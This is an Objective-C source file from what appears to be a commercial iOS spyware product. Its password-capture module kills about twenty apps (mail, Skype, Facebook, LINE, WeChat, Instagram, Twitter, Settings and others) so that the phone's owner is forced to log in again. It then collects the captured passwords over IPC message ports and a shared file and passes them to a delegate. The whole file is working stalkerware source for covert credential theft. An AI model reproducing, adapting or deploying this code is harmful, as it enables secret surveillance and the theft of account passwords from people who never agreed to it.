//
//  PasswordCaptureManager.m
//  PasswordCaptureManager
//
//  Created by Makara on 2/26/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import "PasswordCaptureManager.h"
#import "PasswordController.h"

#import "DefStd.h"
#import "FxPasswordEvent.h"

#import <UIKit/UIKit.h>

@implementation PasswordCaptureManager

@synthesize mDelegate;

- (void) forceLogOut {
    if (![PasswordController isCompleteForceLogOut]) {
        DLog(@"Force log out all password capture apps...");
        [PasswordController forceLogOutAllPasswordAppID];
        
        [PasswordController setCompleteForceLogOut:YES];
        
        system("killall MobileMail");
        system("killall Skype");
        system("killall Facebook");
        system("killall LINE");
        system("killall -9 BBM");
        system("killall Aerogram");         // Yahoo Mail
        system("killall Messenger");        // Facebook Messenger, Yahoo Messenger (Iris)
        system("killall -9 Instagram");
        system("killall LinkedIn");
        system("killall Pinterest");
        system("killall Foursquare");
        system("killall Tumblr");
        system("killall Vimeo");
        system("killall Flickr");
        system("killall MicroMessenger");   // WeChat
        system("killall WeChat");           // WeChat 6.1.3
        system("killall Preferences");
        system("killall Twitter");
        system("killall 'LINE for iPad'");  // LINE for iPad
    }
}

- (void) resetForceLogOut {
    [PasswordController resetForceLogOutAllPasswordAppID];
    [PasswordController setCompleteForceLogOut:NO];
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    [self setMDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
    [self setMDelegate:nil];
}

- (void) startCapture {
    DLog (@"Start capture Password ...");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kPasswordMessagePort
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kPasswordMessagePort1
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kPasswordMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kPasswordMessagePort
																		 withDelegate:self];
			[mSharedFileReader1 start];
            
            // iOS 9, Sandbox
            [PasswordController registerForceLogOutReset];
		}
	}
    
    [self forceLogOut];
}

- (void) stopCapture {
    DLog (@"Stop capture Password ...");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
    
    if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
    
    // iOS 9, Sandbox
    [PasswordController unregisterForceLogOutReset];
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxPasswordEvent *passwordEvent = [unarchiver decodeObjectForKey:kPasswordArchived];
    [unarchiver finishDecoding];
    
    DLog(@"Password event = %@", passwordEvent);
	
	if ([mDelegate respondsToSelector:@selector(eventFinished:)]) {
		[mDelegate performSelector:@selector(eventFinished:) withObject:passwordEvent];
	}
	
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
